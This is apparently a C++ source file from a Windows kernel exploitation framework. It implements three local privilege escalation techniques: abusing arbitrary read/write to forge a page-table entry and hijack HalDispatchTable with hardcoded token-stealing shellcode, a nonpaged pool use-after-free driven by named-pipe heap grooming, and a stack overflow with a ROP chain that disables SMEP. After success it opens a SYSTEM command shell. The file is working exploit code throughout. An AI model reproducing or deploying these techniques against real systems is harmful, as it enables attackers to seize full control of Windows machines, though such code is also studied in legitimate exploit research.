#pragma once
#include "Exploiter.h"

namespace aek {
	
	//Common
	BOOL Exploiter::Error(const char description[]) {
		std::cerr << description;
		return false;
	}

	BOOL Exploiter::Success(const char description[]) {
		std::cout << description;
		return true;
	}

	BOOL Exploiter::Exploit() {
		BOOL result = false;
		if (ArbitraryReadRoutine && ArbitraryWriteRoutine) {
			result = ExploitARAW();
		}
		else if (AllocateTriggerPool && AllocateFakePool && FreeTriggerPool && TriggerCallbackFunction && !chunk_size) {
			result = ExploitNonpagedPoolUaF();
		}
		else if (TriggerStackOverflow && !dummy_size) {
			result = ExploitStackOverflow();
		}
		else {
			std::cout << "No Available Exploit for the Vulnerabilities\n";
			return false;
		}

		if (result) {
			std::cout << "[*] Here goes nt authority\\system shell\n";
			system("cmd.exe /c cmd.exe /K cd C:\\");
		}
		else {
			std::cout << "[-] LPE Failed\n";
		}

		return result;
	}

	//ARAW

	BOOL Exploiter::ExploitARAW() {
		krnl_base = lk.getKernelBase();
		if (!krnl_base) {
			std::cout << "[-] Kernel Base Leak Failed\n";
			return false;
		}

		UINT64 ntMiGetPteAddress = krnl_base + off_MiGetPteAddress;
		UINT64 ntHalDispatchTable = krnl_base + off_HalDispatchTable;

		pte_base = ArbitraryReadRoutine((PVOID)ntMiGetPteAddress);
		if (!pte_base) {
			std::cout << "[-] PTE Base Leak Failed\n";
			return false;
		}
		std::cout << "[+] PTE Base Found : 0x" << std::hex << pte_base << std::endl;

		auto kUSD_pte = lk.calcPteAddr(kUser_shared_data, pte_base);
		auto kUSD_pte_bits = ArbitraryReadRoutine((PVOID)kUSD_pte);
		if (!kUSD_pte_bits) {
			std::cout << "[-] PTE Bits Leak Failed\n";
			return false;
		}
		std::cout << "[+] PTE Bits Found : 0x" << std::hex << kUSD_pte_bits << std::endl;

		auto forged_bits = kUSD_pte_bits & 0x0FFFFFFFFFFFFFFF;
		auto aw = ArbitraryWriteRoutine((PVOID)kUSD_pte, forged_bits);
		if (!aw) {
			std::cout << "[-] PTE AW Failed\n";
			return false;
		}
		std::cout << "[+] Forged PTE Bits Overwritten : 0x" << std::hex << forged_bits << std::endl;

		UINT64 shellcode_arr64[] = {
			0x00018825048B4865,
			0x000000B8808B4800,
			0x02F09B8B48C38948,
			0x0002F0EB81480000,
			0x000002E88B8B4800,
			0x8B48E57504F98348,
			0xF0E180000003608B,
			0x4800000360888948,
			0x0000000000C3C031
		};

		for (int i = 0; i < 9; i++) {
			aw = ArbitraryWriteRoutine((PVOID)(kUser_shared_data + 8 * i), shellcode_arr64[i]);
			if (!aw) {
				std::cout << "[-] Shellcode AW Failed\n";
				return false;
			}
		}
		std::cout << "[+] Shellcode written in 0x" << std::hex << kUser_shared_data << std::endl;

		auto original_hal08_function = ArbitraryReadRoutine((PVOID)ntHalDispatchTable);
		if (!original_hal08_function) {
			std::cout << "[-] HalDispatchTable Leak Failed\n";
			return false;
		}
		std::cout << "[+] HalDispatchTable+0x8 Found : 0x" << std::hex << original_hal08_function << std::endl;

		aw = ArbitraryWriteRoutine((PVOID)ntHalDispatchTable, kUser_shared_data);
		if (!aw) {
			std::cout << "[-] Hal AW Failed\n";
			return false;
		}
		std::cout << "[+] HalDispatchTable+0x8 Overwritten\n";

		NtQueryIntervalProfile_t NtQueryIntervalProfile =
			(NtQueryIntervalProfile_t)GetProcAddress(
				GetModuleHandle(
					TEXT("ntdll.dll")),
				"NtQueryIntervalProfile"
			);

		ULONG exploit = 0;
		NtQueryIntervalProfile(
			0x1234,
			&exploit
		);

		aw = ArbitraryWriteRoutine((PVOID)ntHalDispatchTable, original_hal08_function);
		if (!aw) {
			std::cout << "[-] Hal AW Failed\n";
			return false;
		}
		std::cout << "[+] HalDispatchTable+0x8 Recovered\n";

		return true;
	}
	//

	// NonpagedPool_UAF

	BOOL Exploiter::ExploitNonpagedPoolUaF() {
		krnl_base = lk.getKernelBase();
		if (!krnl_base) {
			return Error("[-] Kernel Base Leak Failed\n");
		}

		if (!PrepareShellcode()) {
			return Error("[-] Error occured while Preparing Shellcode...\n");
		}

		if (!PrepareROP((PVOID)stack_pivot_0x48000000)) {
			return Error("[-] Error occured while Preparing ROP on Fake Stack...\n");
		}

		if (!DefragmentPool()) {
			return Error("[-] Error occured while Defragmenting...\n");
		}
		Success("[+] Defragmenting Pool Area...");

		if (!SprayPool()) {
			return Error("[-] Error occured while Spraying...\n");
		}
		Success("[+] Spraying Heap Area...");

		if (!MakePoolHoles()) {
			return Error("[-] Error occured while Making holes...\n");
		}
		Success("[+] Making Holes in Pool Area...");


		if (!AllocateTriggerPool()) {
			return Error("[-] Error occured while Allocating a chunk...");
		}

		if (!FreeTriggerPool()) {
			return Error("[-] Error occured while Freeing a chunk...");
		}

		if (!FillPoolHoles()) {
			return Error("[-] Error occured while Filling holes...");
		}
		
		if (!TriggerCallbackFunction()) {
			return Error("[-] Error occured while Triggering...");
		}

		return true;
	}

	// Stack_BOF

	BOOL Exploiter::ExploitStackOverflow() {
		auto payload_size = dummy_size + 4 * sizeof(UINT64);
		PVOID payload = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if (!payload) {
			return Error("[-] Error occured while Allocating Payload\n");
		}

		if (!PrepareShellcode()) {
			return Error("[-] Error occured while Preparing Shellocode\n");
		}

		if (!RtlFillMemory(payload, dummy_size, 0x41)) {
			return Error("[-] Error occured while Filling Payload Failed\n");
		}

		auto rop = ROP(krnl_base, 4);
		rop << pop_rcx
			>> cr4_value_nosmep
			<< mov_cr4_rcx
			>> shellcode;

		RtlCopyMemory((BYTE*)payload + dummy_size, rop(), rop.GetSize());
		if (!TriggerStackOverflow(payload, payload_size)) {
			return Error("[-] Error Occured while Triggering Stack Overflow\n");
		}

		return true;
	}

	//

	VOID Exploiter::SetChunkSize(size_t chunk_size) {
		this->chunk_size = chunk_size;
	}

	BOOL Exploiter::CreateNPipes(size_t amount) {
		const size_t alloc_size = chunk_size - pipe_header_size;
		UCHAR* write_buffer = new UCHAR[alloc_size];
		HANDLE read_pipe = NULL, write_pipe = NULL;
		DWORD bytes_written;
		RtlFillMemory(write_buffer, alloc_size, 0x41);

		if (groomed_chunks.capacity() != 0) {
			if (groomed_chunks.capacity() < amount) {
				delete[] write_buffer;
				return Error("[-] Small Vector Capacity\n");
			}
		}

		for (size_t i = 0; i < amount; i++) {
			if (!CreatePipe(&read_pipe, &write_pipe, NULL, alloc_size)) {
				delete[] write_buffer;
				return Error("[-] CreatePipe Failed\n");
			}
			if (!WriteFile(write_pipe, write_buffer, alloc_size, &bytes_written, NULL)) {
				delete[] write_buffer;
				return Error("[-] WriteFile Failed\n");
			}

			if (groomed_chunks.capacity() != 0) {
				PipeHandles pipe_handle = { read_pipe, write_pipe };
				groomed_chunks.push_back(pipe_handle);
			}
		}
		delete[] write_buffer;
		return true;
	}

	BOOL Exploiter::CloseNPipes() {
		for (size_t i = 0; i < groomed_chunks.size(); i += 2) {
			auto handles = groomed_chunks[i];
			CloseHandle(handles.read);
			CloseHandle(handles.write);
		}
		return true;
	}

	BOOL Exploiter::DefragmentPool() {
		return CreateNPipes(DEFRAGMENT_CHUNK_AMOUNT);
	}

	BOOL Exploiter::SprayPool() {
		groomed_chunks.reserve(SPRAYING_CHUNK_AMOUNT);
		return CreateNPipes(SPRAYING_CHUNK_AMOUNT);
	}

	BOOL Exploiter::MakePoolHoles() {
		return CloseNPipes();
	}

	BOOL Exploiter::FillPoolHoles() {
		auto pivot = ROP(krnl_base, 1);
		pivot << stack_pivot_0x48000000;
		for (size_t i = 0; i < SPRAYING_CHUNK_AMOUNT / 2; i++) {
			AllocateFakePool((UINT64)*(pivot()));
		}

		return true;
	}

	BOOL Exploiter::PrepareROP(PVOID stack_address) {
		UINT64 stack_alloc_adress = (UINT64)stack_address - 0x1000;
		LPVOID kernel_stack = VirtualAlloc((PVOID)stack_alloc_adress, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!kernel_stack) {
			return Error("[-] Kernel Stack Allocation Failed\n");
		}

		if (!VirtualLock(kernel_stack, 0x14000)) {
			return Error("[-] Kernel Stack Locking Failed\n");
		}
		
		if (!RtlFillMemory(stack_address, 0x28, 0x41)) {
			return Error("[-] Kernel Stack Dummying Failed\n");
		}

		auto rop = ROP(krnl_base, 4);
		
		if (!shellcode) {
			return Error("[-] Shellcode Address is NULL\n");
		}

		rop << pop_rcx
			>> cr4_value_nosmep
			<< mov_cr4_rcx
			>> shellcode;

		if (!RtlCopyMemory(((BYTE*)stack_address + 0x28), rop(), rop.GetSize())) {
			return Error("[-] Kernel Stack Writing ROP Chain Failed\n");
		}

		return true;
	}

	VOID Exploiter::SetDummySize(size_t dummy_size) {
		this->dummy_size = dummy_size;
	}

	BOOL Exploiter::PrepareShellcode() {
		shellcode = VirtualAlloc(NULL, sizeof(shellcode_bytes), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (shellcode == nullptr)
			return false;
		RtlCopyMemory(shellcode, shellcode_bytes, sizeof(shellcode_bytes));
		return true;
	}
}